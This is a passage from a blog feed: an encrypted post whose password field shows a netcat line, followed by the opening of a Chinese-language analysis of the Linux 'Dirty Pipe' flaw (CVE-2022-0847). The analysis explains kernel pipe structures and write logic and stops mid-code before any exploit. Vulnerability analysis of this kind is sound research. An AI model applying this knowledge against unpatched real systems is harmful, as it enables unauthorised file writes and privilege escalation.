b315535abfbc1c39e20910524c2766d4301e2631eb6e398007ac851421f8023e65b73d0ad59c3c4ec429e8af7a1d31270fa3d07a1f846d34db11521838b27306c0f4cf2a1a4839062c9bc2962c0205fae1f226849def5694a49561f7681f99b92b2fe4868f1a6996a395a393b0ff896d6e4219cee828d2604cce53f8d86df52b99ba0d7682da1e3da8e851e2314e8de7ee71084585d9240cc6d16dee8a5b22f5df3c0931aa29da1644e61dda17819498f7fffd2ed0aa9ef451f0b8b5bc71825a78bc3352266d909a1e143863837831faef30f1c934b85ece9f5b9b409748df75933ef7cf4ce541925f62e25dac1170ca263477c0ebe963364532e0dfa0933ce96e438499c15f275d176db75d8b842372750c7a6b78728fc654834846f0597ae151ea4a904487941dec34b241e1656dd0f36b214131f4987de69dadff997e4851e91a61031618a204d28bac8b017c30e3bd326becbca75434789a4022cfb098ae5a73877e3de79d8fb9e3fc2650d86b479ee24b0fac66e6b5ae1d33ca8f12fc7ea5617f0a01b33c1cdd9b3cca3ecadc1d240dc1a965413ed8214853730166240f9a22ef8e77c0f231f56faca61b277a06a4c9eceb5d54a3a89322baa6c98ccab35040be511440b09ce3856dea2ef23b0d87852794cea13e71067c41e86f816599a65f20e6bb4e5b62867903f470ce8049ed7ee40eba2c9c4360978b15d6f383d82cac2888c49c0e6e16f897bdbc50259f06326a699b049838d000f129dd28147cf4d1fad1eab2f23ad4cc451a7a2e78685d1d2d3be46ac019867e42af0793007b6c415efffc39fe4c8956fe32fb25667e4096801e706f377367346aca5c9a0d6c0b674be332ef17fada3cf14988e1ca29bc87c14aeb9cee6289a54899a90b4d4652f4634864d956d2bc6e0fc72aea6e13ccaea311b2849c481eec2242f48a045528d13347293078bf1405a0242c72fdf6fae2e98128227e8d5de09b96f2f0a530af4a2f5caf5824ecc1b3ec0cfdb0ae68be888b38c0f00844b143a69708e13e7eb087f4827d93237ade2175bc2a5f96c0c583a80be49466058b3257648ce5a475d31044fa33a192750309fbc14a73880157ed2fb16e382a3c6c496ca6acf1353fb618095637c70e1c486da116391792fb39fa83a10f3260e8db52dcb7054f570b12344e0fbcffa55a0a6233278a05ef2952715e4d0613b3085d27f2fed8f631d9039679bec3bee13853e0ed40fd1f15ff9cab1617e46160810c2ed8c2a91f3ce5ed4dc1eef75f24df504581bacf1e9ad6fb9ad7ab8d50f3a8170071b75df08f01e35d4d99ae59fe6e014cb08851309f8cdcbcec66c1dba12d9b89895c803b11336c53abd285e97f4db902a0b0ee1631e55b2a1ec6b097b4dd09b17a509386ed7d6b0f1a95da6247974a8e8b971be307e49bb9743ed61e7ad66e931b7f2b6be4fbdc850d3ebd0c973cabb547b12cedde0dd058b9cad9b635d58800457661a27d477deee271b7fb949ec2eb5a16af843e9ebe0e91fab2b1874341100faf5098f339acffd3a2a49438c6bdca32985342f7b1879416f478b2ea2d3a1674df2006011eeba683916818bd2500b780aedcdb904f569317592f65cdf59b35e9ebd8694f2581655457df9f4124571d3e1714e4809a5744506a3f2b087eea9567f7b36443fd1bf4ead17fa0d6d1d21a64ba6f1510aa3df85c7b7c0cfa7969ab9c951a77a2c765cd232e865f23525c1ca97ca356e58e2613ce150b6310612e3fe03dbe4286792b86b81e618d44d918abd9271d30bfbbcaa50351f418391841b0c7cca21a0f2ee12a03f429efc8ee46f2789934ee98f6916ce4ca35a7ec0a174115ffa65c55b7c0c19b66254469bc25a76867bf3047f3667a98e6b10151a2f9463b7c3f35ebe9baacb89f9a115d691a15a77dfd9beae19af41d65a71d3ef9e555fefdb17249740d54c1d3fc6236a83711a5c171248a0956cb89830ec438f045d00bf0ef689311a9fbb6cbbe483da13f66061ac93f4b078627280d4eb0ea46de2a42331b54469c2c53c7d5f87e80becc0f941eceb69bb45ca223c7cf0bec504e776581ba6200bfe14b42bdce1ba9d6b31567aec0d6ace4d42ac90faaa855fb5e9ce8bbd6a5004b9a199bb2d0bcdb73d2c1898944f7716fcbef520ae2819ce5341290a377e65a467515d3ab993ce6b137472ee8cc24ce4b33d4db46c04fa40eb88b60796b91ab2f89c3b7abc271ffdeec1c2dcdd08980e0d24c3258524c91b8ef3cc118817ec16fcf496b385f1048e844b56968fdfd68dcf4c17fee0bb5a40688ab3a6a3650f16a4a9b28e8327ac3cbd5c9f48086745079eb5cbda2efa85e10da91af35ae97c3dd8bb15c72fa4ac5fbd823f2e98446301d630783111b916ae539c95b1051a8ca010609b2a40c61f0fec3d4b537f77fa6138b1fe5630ab87a8e1c0a6818caa1ed1a3fc15f719d312296d62607a699a9311eacd215357b018c29b0e82387d5aae91f3b525d2100dc05ba73c225b285a3c5f7937174bfb569680c7ae4562006543697cb2d9c661e394a69edd483d22b0681d7d18cc63518e4f4b5312624ae21bab2d8013909c44ac35324d6fd0d568bd7dd1a5c04ece10f7069e1b5b28f018453450afe73c370a9a79105d2571573f3ae452fef8da2aba3695fbf6719ed9fb641c48a11b1958ec7115454b8d8a87c86111f2dcae8fad6b45f7d1bea528cefeee98b1aebac34a1d9f2fff80c810e8f5b97381e53eb6e3c748eca405446d4560b78ef3b2514d21408fa33ff5f3bbc223349799d6da8a86295779c5aada9415478f9ba64b0b47da42f9e88ebe760d17a8e8dd4710edac628489279270125806396be6474c409b88086cc548d03c91c11e71b7e999bcc688c2edad81318ffc923f27526e5ce79afd8f46c151010bbd7c318751d4f10b3642f4b889ab68257741f57ab87210a6b710e0ee83714905aaf80b2a11aa0f4701cb2dc64888270bd87fe1dc0e6b11392c96ebcfde9f079f664fa9fe7f0ea095b6d85502f149a04c3cfbd7bfbdfd4ba6f7d56639dec40acf84e3a7f3c27fe355c6dccf3ddd1040ab8bc78426c827ae605e3a6eaf9f094bc7ec9e56739d07189bce0a616f7847fb37b219beb1ba414ea97ddfdf2c407ab508600d9287773bea29d313bca89870104576a1571f5307653600d391107dcff437d3a9ec2d9f9d822e32328731b38afc764c92ab6cdf5a3ec8bf1811060e478b1767b5c75384744e58102ae4f0245d208a2d117ed6c5e865356786270ac78a20db8472744932c4615dcfb9220234632b3c4158fb7334be3e8b12b729e699dcb63d02e9ac99c11f6a123a247da5992a7e49f336927e53a900045e997df991ac268cb11e58282fb46223f0fe7678c6bdff196b442baa42cbcf2b8db74be90f200b71d829f7239f506e549911f62da77b1293981a471f0f1f8a3f00c8093d3bf5bbe834090280f9eaab0661f193886e3555e1e038d4f0a39bd1984e3dea2a8a82efe0f6f4741fae134300f22cd32b256df826a95234f28804f8d174a5c76920abce4e842e1ce263ba7ea0f7463c554fec87edd8c3df43251dbaa65b8df33b7cbde6767bb9c05ffa5b0d07872107758de690123cfb1328bef599f23e70ebdd687ae4ce68d5c596bd40397b816ff99b45de8dcfd3c74758bb5f27b5019db8fffc1255d5ea2c0b79259b85ed0c0c7ef25f2c443588aa1a2ab0a9f22bdfaccb5608fa9dd8da8c1458160ab42478dff3871e1b27f5723e6344bb3751636ecca45464d6d8d925433d7282bddf3249c2c0220683c5a1117c6b93c0b9962d8ac98e0395b8923b6bb59eb8eba72019bc19122f1168c96a89ed1dde38bcb9433bc1f7a36a9e7b39ed0bc5e4444cb4ef7b5d5957f18206ec56248728390a03856b6fe5dfb73406d07b87b7fd1f82961d4fb140925ff220b2098e37d009af386ccba487ddeed8f127d4b347063126a6d97b3880c22cd404fa5d78522927734c30e4d2c263de152c0601997e8923536e99e8c638a204a560068865836360edf61d1cec66b798ed948c1a8309ab2f20f9e0282930fe1c9c807935f75aef37ac9bd50283aea5a292c85d349a650605774db42be716dda6dca4903ea0e676a92724f073e2ff7b10e2fc30f71ecdefa4bcec5ff738181ab1de4563580aec2c109259ec1225e649f2b3b68c218470c1aa3fe1907b3159374fec31ac5bf5135bf961ae36aee0d3579f9835c4cd7287cf4389aefa002b2b950cbf260855ad3dbf34abb4e6b2af9d26e989e2dae6fd8ad1bc8a76b35608d2372aa92f111c5b5e15d8258067c46a732baedaab78e47160cdc5e5923fafd60d9c99446342b1f78444d4ffa0ac532936ac7fc66141fe03e29bb8d0a3c05eacc5a4572e23689eb675de27615da69e72153e0f744b11dd78a32af6ace939bb296381721f7a2c629fcd12263c309fea75ed65c7d9171b596d9ffc1453d0118d24479768853ab5a53a693a7c477311767f311673fe11e72b49894b2a6666b2b7e6149fd50b633dacbe76bea53fa1979851e4f858215e971aac90ebe1aabc36fedd345e4e18db46d594de7a2d3be1033e25dd1130930dc27cc187c162c59fbb51872313132c3f6ce42c814f9035b12ecf1b2d8c4671fd97b119ea6f2bd38f26ce131e5902e0379b24d1854c14f33340cea6a487287e4d96d99c6c23a151e9849e6bdcdf51b074fc81ef85ef6d12c86bcbc96a15845cfd00dea255b087a9d7419e96ad5f893e1686ecd7b043d68098134a9069afe7f51a3b27a2f56b2652391b3c20840078db825c60552e46362608fd31a7c1f85b6a4fc66f66e6a415d13dcd07aa69ee3b80c1d9bc4ecdaec9f3727038832e6dc2747c7c14bf58cb9704aba164a477c47e6d015ac2f5fb2ce2a5ba777d1691e30c3d322854d71e720abd86467bba8861c4ce578be0fd21b4bc6de4a95c7de3c958b8e949b395113872bd2b404d4b1389a860a20ef882434ed2b56d70ee7ecc22bae9eb557d108701ca54faf030236df99c1128f36e150f1dbccd18cb750e4c90d1ef040bde27a8f97cbceab8d0c1ef5f8a2bcf3692a46f8271b1014d22839171154031bb1f0472b39ae0fbb14450a0896b4edabda716233b00248e1b6ffebc28972d87be9ce54560fa6d6fc88e14bbe2d2edfc93895ca9c90a34798b5febe34843f916ea414c7d1eb811be9952f0efd69df2da456724881b500e64509d18017841fa1c22bc6eb8a56cd96f04279c9258519818ec1134f97c4889d672d9b86e741f7aa4efae4af2524df100908dab5e3fd4a7548a6eb8dba3d3991b9ac869d28b4e4fdc9390385d8fa25803bd5ed800c0a2dd36b15139c00f22f5ec605078e6e28508b4cd5895d322ea31c945359e55d0e0977041af5369c909c1200038e7b3a8603a443ec047c05cd52f2164f6b42646bef7b0699112b6dcb9042ca954e0861821c87e068d4a67baad9246c68d3829cfe35396af9efc2427d0797f0d07dc65d2df720d34e7acb47be9472582f422cb8da6c41bdff228a9cc9165d86fb136ed29e2d7ee79610c0fecf63f7e9591d25eb2aae8d9b222450361f62098d41909a6540d1fee40a6657a1d7e0b42342903f330ff0457a83ba7eb16025316b595bae4ea294a3f840cd59f68331e66a5c3441f3d4f378f6a0f8c6d00b9977af8e0a09f7ed322ffac708fa5bbfb39e84c03c670ad2f852711fddb8559995496f7ae9a6ef218e8dca4d8901b02719578116741eb02794faafa50e905881f8f0079eef23cce85bdd04a44149efbcd2d0f5d953532f00262e15888e6d61ae1e7585a52fe15bf408e836403e31c18f3317c844954099dabc1c175dae58dd234a4a6e153b97b9d33a8a79076634e714ab6554647173dbf123a1db45a54a130d793bbe8a1d00c31cf0d66099ac041f861a25b1ab1febccba83051654530d179ade407b8b35bfb25ce6986f04efdb9671ffc6cee4106d4d59bf8c8932d61d25fa6ffc8f1265004cab14b478edcd617e3593d8f2bb23e46032ff90d7d5cd128e29d6e58cc775c78b07bec4b0a5bb7196813c6fe3c4ab52f705a4cc6627334ca938eb789fd40c60da8be5babb630c975bdf7e7cc190cb5305edf2130ec5f8655ed29e628be2c441a67a5e5d3e3cae7e0290557e85b288ec9e174055264a8787eb7c486398f9993bdbbd6041d7f29c82b42ea7c1f3e7060d7ffa70d188d3f5ed98cb9dc89fda0e9de6ae894c2f168f1034f9a3986b52b44c905debade59dc1b8d5a48755f2ddf500c4108019dbca361665fe13e120bc5ba127c99e49ef81a530f7bb4dbd947a44cb241a535d8c50ce7a050bd35aa657b3bf9cc05d94532425a093771f809cacfa0313cb4953f4a47e7f722ad37eee10bc217cb242d6509f1ed53905e982bcc9dbefd06a72bb06ae0edd4d261ac668f1f143667978fe326f9224567772bb617807d8215e98904dade2fa8858c27857334298373300d473c8eb55434a96263e0a31f296ac7ffc8212bb00e93bb2837b4db051947a58991f4109d567452374dddc32521688a34b555bd667febed2757f6e1a18af8c21a6fd6e016b45290df317a9e9c312c6e40f34ecd0b61cf243963a1c379332283ad1737c784e1f2e3ed7fd1e46d73a8b7e3017ab49c22eec325b575e440099ad8d199d5fe227566b8a6e3190fd17183bc107cd31c77dabf4e4fb1025a64eeca9a19c5fe91bda666b0801b4245a4e80daacc9df685715f77b3fd606b54ac10f0f8b706e728e576a173fb91702e9bd02859be9ec6c9fa94563a32caf21f279a7beb0c10688991f17bcfdb089912fbf05037d8ae122e8c3b2901958c49dbc9d5bc12ce37488a1467a96dd3e6b3ef012a50eacce387fb31deb30edd8dbcbcd4fb15402eea49d15e127a476a585084ff3166df80a77db8c449ede363b26738dcd8fab95b4a05b9d1c5d873af0d4582bb684cc92ab88dbad7577342564e1be3bc9cc456814991bcb24a682db89a62a060378744a980620357d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">NEEDY GIRL OVERDOSE</summary>
    
    
    
    <category term="PIECES" scheme="http://blog.arttnba3.cn/categories/PIECES/"/>
    
    
  </entry>
  
  <entry>
    <title>【CVE.0x06】CVE-2022-0847 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/"/>
    <id>http://blog.arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/</id>
    <published>2022-03-12T11:39:02.000Z</published>
    <updated>2022-03-21T07:45:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>我超，管人痴！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>CVE-2022-0847 是这两天刚爆出来的一个热乎的内核漏洞，漏洞主要发生在对管道进行数据写入时，由于未对原有的 <code>pipe_buffer-&gt;flags</code> 进行清空，从而导致了<strong>可以越权对文件进行写入</strong>；由于这样的漏洞形式类似于“脏牛”（CVE-2016-5195），但更加容易进行利用，因此研究人员将该漏洞称之为「Dirty Pipe」</p><p>据研究者描述，目前 <strong>5.8 版本以上的内核均会收到该漏洞的影响</strong>，在 <strong>5.16.11</strong>、<strong>5.15.25</strong>、<strong>5.10.102</strong> 版本中才被修复，影响范围不可谓不大，因此这个漏洞也得到了高达 7.8 的 CVSS 评分（CVSS 评分好像改版了，2.0 的标准只有 7.2分）</p><p>这个漏洞的发现源自于一次 CRC 校验失败，感兴趣的可以看<a href="https://dirtypipe.cm4all.com/">原作者的博客</a>，是一段十分奇妙的旅程（笑）</p><p>本次选用进行分析的内核源码为 Linux 5.13.19（因为笔者前些天刚好编译了一个这个版本的内核，刚好受到该漏洞影响，就直接拿来用了）</p><p>在开始分析之前，我们先来补充一些前置知识</p><h2 id="pipe：管道"><a href="#pipe：管道" class="headerlink" title="pipe：管道"></a>pipe：管道</h2><p>稍微接触过 Linux 的同学应该都知道「管道」这一 IPC 神器。而在 Linux 内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> （即创建了一个虚拟文件节点）来表示的，其中在节点上存放管道信息的是一个 <code>pipe_inode_info</code> 结构体（<code>inode-&gt;i_pipe</code>），其中包含了一个管道的所有信息</p><p>当我们创建一个管道时，内核会创建一个 VFS inode 、一个 <code>pipe_inode_info</code> 结构体、两个文件描述符（代表着管道的两端）、一个 <code>pipe_buffer</code> 结构体数组，下图是一张叙述管道原理的经典图例</p><p><img src="https://s2.loli.net/2022/03/09/yTX7aREhPwsJIbM.png" alt="非常经典的一张图"></p><p>用来表示管道中数据的是一个 <code>pipe_buffer</code> 结构体数组，单个 <code>pipe_buffer</code> 结构体用来表示<strong>管道中单张内存页的数据</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: 管道缓冲区中存放了数据的页框</span></span><br><span class="line"><span class="comment"> *@offset: 在 @page 中数据的偏移</span></span><br><span class="line"><span class="comment"> *@len: 在 @page 中数据的长度</span></span><br><span class="line"><span class="comment"> *@ops: 该 buffer 的函数表， 参见 @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: 管道缓冲区的标志位，参见上面</span></span><br><span class="line"><span class="comment"> *@private: 函数表的私有数据</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>创建管道使用的 pipe 与 pipe2 这两个系统调用最终都会调用到 <code>do_pipe2()</code> 这个函数，不同的是后者我们可以指定一个 flag，而前者默认 flag 为 0</p><p>存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()</span><br><span class="line">__do_pipe_flags()</span><br><span class="line">create_pipe_files()</span><br><span class="line">get_pipe_inode()</span><br><span class="line">alloc_pipe_info()</span><br></pre></td></tr></table></figure><p>最终调用 <code>kcalloc()</code> 分配一个 <code>pipe_buffer</code> 数组，默认数量为 <code>PIPE_DEF_BUFFERS</code> （16）个，即一个管道初始默认可以存放 16 张页面的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">pipe = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br></pre></td></tr></table></figure><p>管道形成的核心结构如下图所示</p><p><img src="https://s2.loli.net/2022/03/12/cyUY4fmwHr5I6ts.png" alt="image.png"></p><blockquote><p>page 结构体用以<strong>唯一标识一个物理页框</strong>，参见 <a href="https://arttnba3.cn/2021/11/28/NOTE-0X07-LINUX-KERNEL-MEMORY-5.11-PART-I/">https://arttnba3.cn/2021/11/28/NOTE-0X07-LINUX-KERNEL-MEMORY-5.11-PART-I/</a></p></blockquote><p>管道的本体是一个 <code>pipe_inode_info</code> 结构体，其管理 <code>pipe_buffer</code> 数组的方式<strong>本质上是一个循环队列</strong>，其 head 成员标识队列头的 idx，tail 成员标识队列尾的 idx，<strong>头进尾出</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *@mutex: 保护一切的互斥锁</span></span><br><span class="line"><span class="comment"> *@rd_wait: 空管道中读者的等待点</span></span><br><span class="line"><span class="comment"> *@wr_wait: 满管道中写者的等待点</span></span><br><span class="line"><span class="comment"> *@head: 缓冲区的生产点</span></span><br><span class="line"><span class="comment"> *@tail: 缓冲区的消费点</span></span><br><span class="line"><span class="comment"> *@note_loss: 下一次 read() 应当插入一个 data-lost 消息</span></span><br><span class="line"><span class="comment"> *@max_usage: 在环中使用的 slots 的最大数量</span></span><br><span class="line"><span class="comment"> *@ring_size: 缓冲区的总数 (应当为 2 的幂次)</span></span><br><span class="line"><span class="comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *@tmp_page: 缓存的已释放的页面</span></span><br><span class="line"><span class="comment"> *@readers: 管道中现有的读者数量</span></span><br><span class="line"><span class="comment"> *@writers: 管道中现有的写者数量</span></span><br><span class="line"><span class="comment"> *@files: 引用了该管道的 file 结构体数量 (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *@r_counter: 读者计数器</span></span><br><span class="line"><span class="comment"> *@w_counter: 写者计数器</span></span><br><span class="line"><span class="comment"> *@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *@bufs: 管道缓冲区循环数组</span></span><br><span class="line"><span class="comment"> *@user: 创建该管道的用户</span></span><br><span class="line"><span class="comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="管道函数表："><a href="#管道函数表：" class="headerlink" title="管道函数表："></a>管道函数表：</h3><p>阅读 pipe 系统调用源码，注意到如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()</span><br><span class="line">__do_pipe_flags()</span><br><span class="line">create_pipe_files()</span><br><span class="line">alloc_file_pseudo()</span><br></pre></td></tr></table></figure><p>在创建管道文件的函数 <code>create_pipe_files()</code> 中，传入 <code>alloc_file_pseudo()</code> 的函数表为 <code>pipefifo_fops</code>，这便是管道相关的操作的函数表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create_pipe_files</span><span class="params">(<span class="keyword">struct</span> file **res, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">f = alloc_file_pseudo(inode, pipe_mnt, <span class="string">&quot;&quot;</span>,</span><br><span class="line">O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),</span><br><span class="line">&amp;pipefifo_fops);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>该函数表中定义了我们对管道的相关操作会调用到的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">.open= fifo_open,</span><br><span class="line">.llseek= no_llseek,</span><br><span class="line">.read_iter= pipe_read,</span><br><span class="line">.write_iter= pipe_write,</span><br><span class="line">.poll= pipe_poll,</span><br><span class="line">.unlocked_ioctl= pipe_ioctl,</span><br><span class="line">.release= pipe_release,</span><br><span class="line">.fasync= pipe_fasync,</span><br><span class="line">.splice_write= iter_file_splice_write,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="管道的写入过程"><a href="#管道的写入过程" class="headerlink" title="管道的写入过程"></a>管道的写入过程</h3><p>查表 <code>pipefifo_fops</code> 可知当我们向管道内写入数据时，最终会调用到 <code>pipe_write</code> 函数，大概流程如下：</p><ul><li>若管道非空且上一个 buf 未满，则先尝试向上一个被写入的 buffer写入数据（若该 buffer 设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位）</li><li>接下来开始对新的 buffer 进行数据写入，若没有<code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位则分配新页面后写入</li><li>循环第二步直到完成写入，若管道满了则会尝试唤醒读者让管道腾出空间</li></ul><p>这里我们可以看出 <code>PIPE_BUF_FLAG_CAN_MERGE</code> <strong>用以标识一个 pipe_buffer 是否已经分配了可以写入的空间</strong>，在大循环中若对应 pipe_buffer 没有设置该 flag（刚被初始化），则会<strong>新分配一个页面供写入，并设置该标志位</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 